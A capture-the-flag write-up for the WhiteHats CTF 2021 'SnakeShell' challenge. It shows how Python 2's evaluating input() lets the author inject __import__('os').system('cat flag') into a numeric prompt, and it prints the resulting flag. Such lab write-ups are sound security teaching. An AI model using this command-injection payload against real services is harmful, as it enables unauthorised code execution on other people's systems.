---
layout: writeup
ctf: WhiteHats CTF 2021
chal: SnakeShell
category: misc
flag: WH2021{Heh_wH0'5_tH3_0ne_wH0_G0T_pwned!}
points: 972
solves: 16
---

> We have employed the best snakes in the industry to perform automatic hacking for you. You simply need to enter the target IP address and number of tries and it will infiltrate the system for you.

> All will be done so easily, just like what you see in movies. Experience the power of this tool now!

As we aren't given any files and only a server, first thing to do is to fuzz the server with unexpected input. It expects an IP address and integer, but what if we gave a string?

```
ariana@ariana ~> nc chals.whitehacks.ctf.sg 10111

        Hacking Machine 1.0 Pro Max Super
        Makes hacking as easy as in movies.

Please enter the IP address of your enemy: asd
Enter the number of tries: asd
Traceback (most recent call last):
  File "./snake.py", line 9, in <module>
    num = int(input("Enter the number of tries: "))
  File "<string>", line 1, in <module>
NameError: name 'asd' is not defined
```

We immediately see the flaw is because it uses python2 `input`. This reminded me of [this writeup](https://ctftime.org/writeup/20660) that cheezed an entire crypto challenge in DefCon quals 2020, hence I tried it and got the flag!

```
ariana@ariana ~> nc chals.whitehacks.ctf.sg 10111

        Hacking Machine 1.0 Pro Max Super
        Makes hacking as easy as in movies.

Please enter the IP address of your enemy: asd
Enter the number of tries: __import__('os').system('cat flag')
WH2021{Heh_wH0'5_tH3_0ne_wH0_G0T_pwned!}
HACKING asd IN PROGRESS...
Exploit started, attacking asd
HACKING COMPLETED. YOU ARE IN!
```
